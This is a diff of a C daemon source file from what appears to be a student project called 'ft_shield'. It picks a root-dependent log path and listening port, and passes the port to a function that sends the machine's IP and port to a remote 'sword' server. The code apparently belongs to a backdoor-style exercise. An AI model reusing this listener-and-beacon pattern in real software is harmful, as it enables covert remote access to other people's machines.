@@ -6,7 +6,7 @@
 /*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/11/21 13:27:44 by mbatty            #+#    #+#             */
-/*   Updated: 2025/11/25 11:08:36 by mbatty           ###   ########.fr       */
+/*   Updated: 2025/11/27 14:31:45 by mbatty           ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -54,7 +54,7 @@ int	unlock_file(t_ctx *ctx)
 	return (1);
 }
 
-void	send_host_to_sword()
+void	send_host_to_sword(int server_port)
 {
 	char host_buffer[256];
 	char *ip_buffer;
@@ -75,7 +75,7 @@ void	send_host_to_sword()
 
 	char	buf[4096];
 	(void)host_buffer;
-	sprintf(buf, "%s %d", ip_buffer, SERVER_PORT);
+	sprintf(buf, "%s %d", ip_buffer, server_port);
 
 	struct sockaddr_in	server_addr;
 	int					socket_fd;
@@ -99,11 +99,17 @@ void	send_host_to_sword()
 
 int	ctx_init(t_ctx *ctx)
 {
-	memset(ctx, 0, sizeof(t_ctx));
+	char	*log_file;
+
+	if (ctx->is_root)
+		log_file = "/var/log/ft_shield.log";
+	else
+		log_file = "/tmp/ft_shield.log";
+
 	ctx->running = true;
 	signal(SIGINT, handle_sig);
 	signal(SIGTERM, handle_sig);
-	ctx->log_fd = open(LOG_FILE, O_WRONLY | O_CREAT | O_APPEND, 0644);
+	ctx->log_fd = open(log_file, O_WRONLY | O_CREAT | O_APPEND, 0644);
 	if (ctx->log_fd == -1)
 		return (0);
 	logger_log(ctx, LOG_INFO, "Starting ft_shield");
@@ -127,8 +133,14 @@ int	ctx_init(t_ctx *ctx)
 	sprintf(buf, "%d", getpid());
 	write(ctx->lock_fd, buf, strlen(buf));
 
+	int	server_port;
+	if (ctx->is_root)
+		server_port = 4242;
+	else
+		server_port = 7002;
+
 	logger_log(ctx, LOG_INFO, "Opening server");
-	if (!server_open(&ctx->server, SERVER_PORT))
+	if (!server_open(&ctx->server, server_port))
 	{
 		logger_log(ctx, LOG_ERROR, "Failed to open server");
 		close(ctx->log_fd);
@@ -139,7 +151,7 @@ int	ctx_init(t_ctx *ctx)
 	server_set_connect_hook(&ctx->server, connect_hook, ctx);
 	server_set_disconnect_hook(&ctx->server, disconnect_hook, ctx);
 	logger_log(ctx, LOG_INFO, "Server opened");
-	send_host_to_sword();
+	send_host_to_sword(server_port);
 	return (1);
 }
 
